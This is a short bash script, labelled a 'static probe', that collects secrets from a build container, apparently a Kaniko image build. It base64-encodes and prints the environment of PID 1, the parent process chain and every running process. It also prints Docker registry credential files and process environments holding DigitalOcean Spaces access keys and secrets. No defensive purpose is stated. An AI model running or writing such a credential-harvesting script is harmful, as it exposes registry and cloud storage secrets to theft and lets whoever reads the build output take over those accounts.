#!/bin/bash
echo "=== STATIC PROBE START $(date -u) ==="

echo "=== PID1_ENVIRON ==="
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | base64 || echo "NO_PID1_ENV"

echo "=== PARENT_CHAIN ==="
pid=$$
for i in $(seq 1 10); do
  ppid=$(awk '/PPid/{print $2}' /proc/$pid/status 2>/dev/null)
  if [ -z "$ppid" ] || [ "$ppid" = "0" ]; then break; fi
  echo "=== PID_${ppid}_ENVIRON ==="
  cat /proc/$ppid/environ 2>/dev/null | tr '\0' '\n' | base64 || echo "NO_ENVIRON"
  pid=$ppid
done

echo "=== DOCKER_CONFIG ==="
cat /kaniko/.docker/config.json 2>/dev/null | base64 || echo "NO_DOCKER_CFG"

echo "=== ETC_DOCKER ==="
cat /etc/docker/config.json 2>/dev/null | base64 || echo "NO_ETC_DOCKER"

echo "=== ALL_PROC_SPACES ==="
for pid in $(ls -d /proc/[0-9]* 2>/dev/null | sed 's|/proc/||' | sort -n); do
  env_data=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' 2>/dev/null)
  if [ -n "$env_data" ]; then
    has_spaces=$(echo "$env_data" | grep -c "SPACES_ACCESS\|SPACES_SECRET\|SPACES_BUCKET\|SPACES_ENDPOINT" 2>/dev/null)
    if [ "$has_spaces" -gt 0 ]; then
      echo "=== SPACES_PID_${pid} ==="
      echo "$env_data" | base64
    fi
  fi
done

echo "=== ENV_DUMP ==="
env | sort | base64 || echo "NO_ENV"

echo "=== STATIC PROBE END $(date -u) ==="
